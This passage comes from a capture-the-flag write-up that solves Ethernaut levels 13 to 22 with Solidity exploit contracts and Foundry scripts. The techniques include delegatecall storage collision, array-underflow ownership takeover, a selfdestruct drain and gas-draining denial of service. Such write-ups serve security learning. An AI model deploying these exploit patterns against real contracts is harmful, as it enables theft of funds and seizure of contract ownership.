invalid gateThree part one\");\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nMake it past the gatekeeper and register as an entrant to pass this level.\n\n**Explanation:**\n\n1. We have to call the \\`enter()\\` function, without being revert by modifier checks.\n2. We need to pass three modifier checks. We can simply pass \\`gateOne()\\` by calling it from another contract.\n3. To bypass \\`gateTwo()\\` we need to send exact \\`gas\\` that should result the modulo 8191 to zero.\n4. \\`gasLeft()\\` is a method which calculates the remaining gas after executing instructions before it invoked.\n5. We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.\n6. One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.\n7. To pass the \\`gateThree()\\` we need to some calculations. It takes the \\`_gateKey\\` a bytes8 value as argument.\n8. The modifiers checks the lower 32 bits of the gatekey after converting to uint64.\n9. So, we can calculate the lower 16 bits of the \\`tx.orgin\\` and pad it with zeros to pass the gatThree and gateOne.\n10. Two pass the gateTwo we can add random bits to the MSB position.\n\n**Level13Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level13.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack {\n    GatekeeperOne public instance =\n        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);\n\n    function exploit() external {\n        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &\n            0xFFFFFFFF0000FFFF;\n        for (uint256 i = 0; i < 300; i++) {\n            uint256 totalgas = i + (8191 * 3);\n            (bool success, ) = address(instance).call{gas: totalgas}(\n                abi.encodeWithSignature(\"enter(bytes8)\", gateKey)\n            );\n            if (success) {\n                break;\n            }\n        }\n    }\n}\n\ncontract Level13Sol is Script {\n    GatekeeperOne public instance =\n        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        new Attack().exploit();\n\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level13Solution.s.sol:Level13Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Gatekeeper Two\n\n**Level14.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperTwo {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    uint x;\n    assembly { x := extcodesize(caller()) }\n    require(x == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nThis gatekeeper introduces a few new challenges. Register as an entrant to pass this level\n\n**Explanation:**\n\n1. Similiar to gatekeeper one, to pass \\`gateOne()\\` here we need to call from a contract.\n2. \\`gateTwo()\\` checks that the caller contract code should zero.\n3. Code inside contract constructor won’t be stored on blockchain. So, we can call the \\`enter()\\` from our attack contract constructor.\n4. To pass the \\`gateThree()\\` we need to do simple XOR operation. To get the \\`gateKey()\\` we need to do \\`uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))\\` XOR \\`type(uint64).max\\`.\n\n\\`\\`\\`\nWe know that\n\n//If x ^ y = z then x ^ z = y\n\\`\\`\\`\n\nLevel14Solution.s.sol\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level14.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n    constructor(){\n        GatekeeperTwo  instance = GatekeeperTwo(0xc3FB4c38f398050206ea0D07D18D693Bc75888AA) ;\n        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n        instance.enter(gateKey);\n    }\n}\ncontract Level14Sol is Script{\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack();\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level14Solution.s.sol:Level14Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Naught Coin\n\n**Level15.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';\n\n contract NaughtCoin is ERC20 {\n\n  // string public constant name = 'NaughtCoin';\n  // string public constant symbol = '0x0';\n  // uint public constant decimals = 18;\n  uint public timeLock = block.timestamp + 10 * 365 days;\n  uint256 public INITIAL_SUPPLY;\n  address public player;\n\n  constructor(address _player)\n  ERC20('NaughtCoin', '0x0') {\n    player = _player;\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n    // _totalSupply = INITIAL_SUPPLY;\n    // _balances[player] = INITIAL_SUPPLY;\n    _mint(player, INITIAL_SUPPLY);\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\n  }\n\n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\n    super.transfer(_to, _value);\n  }\n\n  // Prevent the initial owner from transferring tokens until the timelock has passed\n  modifier lockTokens() {\n    if (msg.sender == player) {\n      require(block.timestamp > timeLock);\n      _;\n    } else {\n     _;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nNaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\n\n**Explanation:**\n\n1. NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.\n2. NaughtCoin only implemented the \\`lockTokens()\\` modifier on \\`transfer()\\` function only.\n3. There are other ways to transfer tokens from one address to other without using \\`transfer()\\`\n4. Player can approve the allowances of their tokens to someone, and they can use \\`transferFrom()\\` function to transfer tokens on behalf of player.\n\n**Level15Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level15.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack {\n    NaughtCoin public instance =\n        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);\n    function exploit(address _player) public {\n        require(instance.allowance(_player, address(this))    > 0, \"Not approved\");\n        require(\n            instance.transferFrom(\n                _player,\n                address(this),\n                instance.balanceOf(_player)\n            ),\n            \"Transfer to attacker failed\"\n        );\n    }\n}\n\ncontract Level15Sol is Script {\n    NaughtCoin public instance =\n        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address player = address(instance.player());\n        uint playerBalance = instance.balanceOf(player);\n        Attack attack = new Attack();\n        instance.approve(address(attack), playerBalance); //approving attack contract and balance\n        attack.exploit(player);\n\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level15Solution.s.sol:Level15Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Preservation\n\n**Level16.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Preservation {\n\n  // public library contracts\n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner;\n  uint storedTime;\n  // Sets the function signature for delegatecall\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\n    timeZone1Library = _timeZone1LibraryAddress;\n    timeZone2Library = _timeZone2LibraryAddress;\n    owner = msg.sender;\n  }\n\n  // set the time for timezone 1\n  function setFirstTime(uint _timeStamp) public {\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n\n  // set the time for timezone 2\n  function setSecondTime(uint _timeStamp) public {\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n  // stores a timestamp\n  uint storedTime;\n\n  function setTime(uint _time) public {\n    storedTime = _time;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n**Explanation:**\n\n1. Preservation contract uses LibraryContract to set the time in the Preservation contract by using \\`delegatecall\\`.\n2. So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.\n3. Here the Preservation contract doesn’t matches the LibraryContract storage layout.\n4. I observed that calling \\`setSecondTime\\` updates the \\`timeZone1Library\\` address in the Preservation contract.\n5. By exploiting this we can write our own attacker contract that implements the \\`setTime()\\` function and pass that address to the \\`setSecondTime()\\` function so that it will updte the \\`timeZone1Library\\` address in the Preservation contract.\n6. I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the \\`storedTime\\`, i updated the \\`owner\\`. And that makes our attack contract as the owner of the Preservation contract.\n\n**Level16Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level16.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n      address public timeZone1Library;\n      address public timeZone2Library;\n      address public owner;\n\n    function exploit () external{\n          Preservation instance = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);\n        //updating the timeZone1Library with attack contract address\n          instance.setFirstTime(uint(uint160(address(this))));\n          /*\n          when we call  the setFirstTime f'n again ,\n          it delegatecall to the attack contract and then results in changing the owner to msg.sender\n           */\n          instance.setFirstTime(uint(uint160(msg.sender)));\n    }\n    function setTime(uint _owner) external{\n          owner = address(uint160(_owner));\n    }\n    }\n\ncontract Level16Sol is Script{\n      function run() external{\n            Preservation preservation = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);\n            vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n            Attack attack = new Attack();\n            attack.exploit();\n            vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level16Solution.s.sol:Level16Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Recovery\n\n**Level17.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Recovery {\n\n  //generate tokens\n  function generateToken(string memory _name, uint256 _initialSupply) public {\n    new SimpleToken(_name, msg.sender, _initialSupply);\n\n  }\n}\n\ncontract SimpleToken {\n\n  string public name;\n  mapping (address => uint) public balances;\n\n  // constructor\n  constructor(string memory _name, address _creator, uint256 _initialSupply) {\n    name = _name;\n    balances[_creator] = _initialSupply;\n  }\n\n  // collect ether in return for tokens\n  receive() external payable {\n    balances[msg.sender] = msg.value * 10;\n  }\n\n  // allow transfers of tokens\n  function transfer(address _to, uint _amount) public {\n    require(balances[msg.sender] >= _amount);\n    balances[msg.sender] = balances[msg.sender] - _amount;\n    balances[_to] = _amount;\n  }\n\n  // clean up after ourselves\n  function destroy(address payable _to) public {\n    selfdestruct(_to);\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nThis level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.\n\n**Explanation:**\n\n1. The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.\n2. To drain ether we can simply call the \\`destroy()\\` function of the SimpleToken contract.\n3. But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.\n4. We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.\n5. The formula is \\`address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))\\`\n6. \\`0xd6\\` and \\`0x94\\` are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.\n7. By this formula we can recover the SimpleToken address and call the \\`destroy()\\` function to drain all ether.\n\n**Level17Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Recovery} from \"../src/Level17.sol\";\n\ncontract Level17Sol is Script{\n    Recovery public recovery = Recovery(0x7b9D82e39aa30ddAf4c5a9f132F4834926107Caf);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        address myAddress = address(vm.envAddress(\"MY_ADDRESS\"));\n        Attack attack = new Attack();\n        console.log(\"Attack Address : \", address(attack));\n        console.log(\"MY Balance : \", myAddress.balance);\n\n        address _creator = address(recovery);\n\n        address token = attack.exploit(_creator, payable(myAddress));\n\n        console.log(\"Token Address : \", token);\n        console.log(\"MY Balance : \", myAddress.balance);\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack{\n    function exploit(address _creator, address payable _myAddress) public returns(address){\n        address missedToken = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))));\n\n        missedToken.call(abi.encodeWithSignature(\"destroy(address)\", _myAddress));\n\n        return missedToken;\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level17Solution.s.sol:Level17Sol --rpc-url $RPC_URL --broadcast\n\n\\`\\`\\`\n\n## Magic Number\n\n**Level18.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract MagicNum {\n\n  address public solver;\n\n  constructor() {}\n\n  function setSolver(address _solver) public {\n    solver = _solver;\n  }\n\n  /*\n    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____\n     __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___\n      ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__\n       ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___\n        ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____\n         __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________\n          _\\///////////\\\\\\//____/\\\\\\/___________\n           ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\n            ___________\\///_____\\///////////////__\n  */\n}\n\\`\\`\\`\n\n**Goal:**\n\nTo solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.\n\n**Explanation:**\n\n1. To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.\n2. We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.\n3. Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the \\`setSolver()\\` function.\n4. Bytecodes are divided into two main types in solidity.\n   1. Runtime bytecode\n   2. Creation bytecode\n5. **Runtime bytecode** will be stored on blockchain and executes when a call happens\n6. **Creation code** consist of **init data**, **runtime data** and **constructor bytecode**. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.\n7. We can use this creation code to deploy a contract using \\`create\\` opcode and pass the address of the deployed contract to \\`setSolver()\\`.\n\n\\`\\`\\`\nOPCODE   |    NAME\n---------|---------\n 0x60    |    PUSH1\n 0x69    |    PUSH10\n 0x52    |    MSTORE\n 0xf3    |    RETURN\n\nRuntime Opcode Creation:\n\nPUSH1 0x2a (602a) - Pushing 42(0x2a) into the stack. Value(v) parameter to MSTORE.\nPUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to MSTORE.\nMSTORE     (52)   - Store value (0x2a) at position 0x00 in memory.\nPUSH1 0x20 (6020) - Pushing 32 bytes into the stack. Size(s) parameter to RETURN.\nPUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to RETURN.\nRETURN     (f3)   - Returning value of size (32 bytes) from position (0x00).\n\nConcatenating these opcodes gives the runtime bytecode as 602a60005260206000f3.\n\n\nInitialization Opcode Creation:\n\nPUSH10 0x602a60005260206000f3 (69602a60005260206000f3) - Pushing runtime bytecode into the stack.\n                                                         Value(v) parameter to MSTORE.\n\nPUSH1 0x00 (6000)                                      - Pushing 0x00 into the stack.\n                                                         Position(p) parameter to MSTORE.\n\nMSTORE (52)                                            - Stores runtime bytecode at\n                                                         position 0x00 into memory.\n\n\nPUSH1 0x0a (600a)                                      - Pushing 10 (length of the runtime code)\n                                                         into the stack. Size(s) parameter to RETURN.\n\nPUSH1 0x16 (6016)                                      - Pushing 22 (offset position) into the stack.\n                                                         Position(p) parameter to RETURN.\n\n\nRETURN (f3)                                            - Returning value of size (10 bytes)\n                                                         from position (22).\n\nConcatenating these opcodes gives the initialization code as 69602a60005260206000f3600052600a6016f3.\n\n\\`\\`\\`\n\n**Level18Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {MagicNum} from \"../src/Level18.sol\";\n\ncontract Level18Sol is Script{\n    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack().exploit();\n        vm.stopBroadcast();\n\n    }\n}\ncontract Attack{\n    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);\n    function exploit() public{\n        bytes memory bytecode = hex\"69602a60005260206000f3600052600a6016f3\";\n        address _solver;\n          // create(value, offset, size)\n        assembly{\n            _solver:= create(0,add(bytecode,0x20),0x13)\n        }\n        require(_solver != address(0));\n        magicNum.setSolver(_solver);\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level18Solution.s.sol:Level18Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Alien Codex\n\n**Level19.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.5.0;\n\nimport './helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable {\n\n  bool public contact;\n  bytes32[] public codex;\n\n  modifier contacted() {\n    assert(contact);\n    _;\n  }\n\n  function makeContact() public {\n    contact = true;\n  }\n\n  function record(bytes32 _content) contacted public {\n    codex.push(_content);\n  }\n\n  function retract() contacted public {\n    codex.length--;\n  }\n\n  function revise(uint i, bytes32 _content) contacted public {\n    codex[i] = _content;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nClaim ownership to complete the level.\n\n**Explanation:**\n\n1. When we see the solidity version, it is 0.5.0 and it is prone to integer overflow/underflow.\n2. To call any function on the contract we need to call the \\`makeContact()\\` function initially.\n3. AlineCodex inherits the Ownable contract which has the state variable \\`owner\\`. It will be stored at slot 0 combined with \\`contact\\` boolean variable.\n4. Here, in the slot 1 the legth of the \\`codex\\` array will be stored and it will be updated whenever a new element is pushed onto the array.\n5. \\`AleinCodex\\` also changes the length of the \\`codex\\` with \\`retract()\\` function.\n6. \\`revise()\\` function allows us to modify any existing element of the \\`codex\\` array. Keep in mind that each element will stored at different storage slot.\n7. Initially the length of the \\`codex\\` is 0. If we call the \\`retract()\\` it will be \\`0 - 1\\` which results in underflow and stores the value  **\\`2^256 - 1\\`** as the length.\n8. So, now the codex array has access to all the storage slots of the contract. We can use this to update the \\`owner\\` value which is stored at the slot 0.\n9. The codex array elements starts from the slot (keccak256(1)).\n10. We need to pass the index\n    \\`2^256 - 1 - unit(keccack256(1)) + 1\\` to the \\`revise()\\` function for accessing the slot 0.\n11. Pass our address in the \\`revise()\\` function along with the index. Then we will become the owner.\n\n\\`\\`\\`\n\n| Slot Number          | Variables                                                                                          |\n|----------------------|----------------------------------------------------------------------------------------------------|\n| 0                    | - bool public contact<br>- address private _owner<br>- codex[2^256 - 1 - uint(keccak256(1))] + 1 (Access to slot 0)  |\n| 1                    | - codex.length (Number of elements in the dynamic array)                                            |\n| keccak256(1)         | - codex[0] (Array's first element)                                                                 |\n| keccak256(1) + 1     | - codex[1] (Array's second element)                                                                |\n| ...                  | ...                                                                                                |\n| ...                  | ...                                                                                                |\n| ...                  | ...                                                                                                |\n| 2^256 - 1            | - codex[2^256 - 1 - uint(keccak256(1))] (Array's last element)                                      |\n| 0                    | - codex[2^256 - 1 - uint(keccak256(1))] + 1 (got access to slot 0)                                  |\n\n\\`\\`\\`\n\n**Level19Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ninterface IAlienCodex{\n\n    function makeContact() external;\n    function record(bytes32 _content) external;\n    function retract() external;\n    function revise(uint i, bytes32 _content) external;\n\n}\n\ncontract Level19Sol is Script{\n    IAlienCodex public instance = IAlienCodex(0xe5EC55D210Edd23dBB7d055E9ed63DAA8E35e493);\n    function run() external{\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n\n\n    uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;\n    bytes32 myAddress =  bytes32(uint256(uint160(vm.envUint(\"MY_ADDRESS\"))));\n\n    instance.makeContact();\n    instance.retract();\n    instance.revise(index,myAddress);\n\n    bytes32 newOwner = vm.load(address(instance),bytes32(uint(0)));\n\n    console.logBytes32(newOwner);\n\n    vm.stopBroadcast();\n\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level19Solution.s.sol:Level19Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Denial\n\n**Level20.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Denial {\n\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call{value:amountToSend}(\"\");\n        payable(owner).transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = block.timestamp;\n        withdrawPartnerBalances[partner] +=  amountToSend;\n    }\n\n    // allow deposit of funds\n    receive() external payable {}\n\n    // convenience function\n    function contractBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\\`\\`\\`\n\n**Goal:**\n\nDeny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.\n\n**Explanation:**\n\n1. We should revert the call when the owner calls the \\`withdraw()\\` function. But if we do a simple revert in our contract fallback it won’t work.\n2. Because withdraw function doesn’t check for the return value.\n3. One thing we can do is, drain the gas of the transaction that is sent by the owner.\n4. Call to partner is made by the \\`call\\` which will forward all the remaining gas to the external call.\n5. So, we can drain all the gas by writing a most expensive computation in Partner contract.\n6. I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract\n\n**Level20Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Denial} from \"../src/Level20.sol\";\n\ncontract Level20Sol is Script{\n    Denial public instance = Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Hack().exploit();\n        vm.stopBroadcast();\n    }\n}\n\ncontract Hack{\n        Denial public instance = Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));\n        function exploit() public{\n            instance.setWithdrawPartner(address(this));\n        }\n        fallback() external payable{\n            //draining the entire gas with infinite loop\n            uint i = 0;\n            while (i < 10) {}\n        }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level20Solution.s.sol:Level20Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Shop\n\n**Level21.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Buyer {\n  function price() external view returns (uint);\n}\n\ncontract Shop {\n  uint public price = 100;\n  bool public isSold;\n\n  function buy() public {\n    Buyer _buyer = Buyer(msg.sender);\n\n    if (_buyer.price() >= price && !isSold) {\n      isSold = true;\n      price = _buyer.price();\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nСan you get the item from the shop for less than the price asked?\n\n**Explanation:**\n\n1. This is similar to the Elevator challenge. Elevator uses a an external normal function to call.\n2. But here \\`price()\\` should a view function. Which shouldn’t modify the storage of the contract.\n3. So, we cant just keep the number of the calls to the \\`price()\\` function in our Attack contract.\n4. We can make use of \\`isSold\\` variable to check that the \\`price()\\` is called or not. This can be acceptable inside a view function.\n5. So, I wrote Attack contract with \\`price()\\` function defined as view and it returns two different price values for the initial call and second call.\n\n**Level21Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Shop} from \"../src/Level21.sol\";\n\ncontract Level21Sol is Script{\n    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack().exploit();\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack{\n    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);\n\n    function exploit() public {\n        instance.buy();\n    }\n    function price() external view returns (uint){\n        if(instance.isSold() == false){\n            return 100;\n        }\n        return 9;\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level21Solution.s.sol:Level21Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Dex\n\n**Level22.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\nimport 'openzeppelin-contracts/contracts/access/Ownable.sol';\n\ncontract Dex is Ownable(address(0x00)) {\n  address public token1;\n  address public token2;\n  constructor() {}\n\n  function setTokens(address _token1, address _token2) public onlyOwner {\n    token1 = _token1;\n    token2 = _token2;\n  }\n\n  function addLiquidity(address token_address, uint amount) public onlyOwner {\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  }\n\n  function swap(address from, address to, uint amount) public {\n    require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n    require(IERC20(from).balanceOf(msg.sender) >= amount, \"Not enough to swap\");\n    uint swapAmount = getSwapPrice(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swapAmount);\n    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);\n  }\n\n  function getSwapPrice(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  }\n\n  function approve(address spender, uint amount) public {\n    SwappableToken(token1).approve(msg.sender, spender, amount);\n    SwappableToken(token2).approve(msg.sender, spender, amount);\n  }\n\n  function balanceOf(address token, address account) public view returns (uint){\n    return IERC20(token).balanceOf(account);\n  }\n}\n\ncontract SwappableToken is ERC20 {\n  address private _dex;\n  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n        _dex = dexInstance;\n  }\n\n  function approve(address owner, address spender, uint256 amount) public {\n    require(owner != _dex, \"InvalidApprover\");\n    super._approve(owner, spender, amount);\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nThe goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.\n\nYou will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.\n\n**Explanation**:\n\n1. You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.\n2. There is a \\`swap()\\` function inside Dex contract which swaps one token for another. Inside \\`swap()\\` intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.\n3. Observe that the \\`getSwapPrice()\\` is used to get the amount of tokens to be transferred to the \\`to\\` address.\n\n\\`\\`\\`solidity\n  function swap(address from, address to, uint amount) public {\n    require((from == token1 && to == token2) ||\n            (from == token2 && to == token   1), 